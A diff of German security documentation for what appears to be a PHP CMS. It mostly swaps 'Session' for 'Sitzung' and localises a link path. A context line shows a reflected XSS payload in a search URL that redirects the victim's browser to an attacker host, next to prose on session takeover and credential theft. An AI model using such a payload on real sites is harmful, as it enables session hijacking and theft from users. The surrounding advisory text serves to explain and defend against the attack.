@@ -604,7 +604,7 @@ https://example.com/search?SearchText=<script>document.location='https://attacke
 ```
 
 und den Link einem Opfer zukommen lassen. Klickt das Opfer den Link, während es angemeldet ist, läuft das Skript in
-seiner Browser-Session und ermöglicht das Übernehmen der Session, den Diebstahl von Zugangsdaten oder erzwungene
+seiner Browser-Sitzung und ermöglicht das Übernehmen der Sitzung, den Diebstahl von Zugangsdaten oder erzwungene
 Aktionen im Namen des Opfers.
 
 Der CVSS-Wert ist wegen der nötigen Mitwirkung des Benutzers zwar Mittel (6,1), aber die Verbreitung von Suchseiten im
@@ -1150,4 +1150,4 @@ php tests/bin/ezptestrunner_all_tests.php --list-categories
 - [Sicherheitsstandards vom September 2026](../../spezifikationen/6.0/sicherheitsvorgaben-2026-09.md)
 - [Härtung von Datentypen und Eingaben (27. September 2026)](../../spezifikationen/6.0/datentyp-eingabehaertung.md)
 - [RAD-Werkzeuge — Sicherheit](rad-sicherheit.md)
-- [Februar 2026](../../../eng-us/history/2026/2026-02.md)
+- [Februar 2026](../../geschichte/2026/2026-02.md)
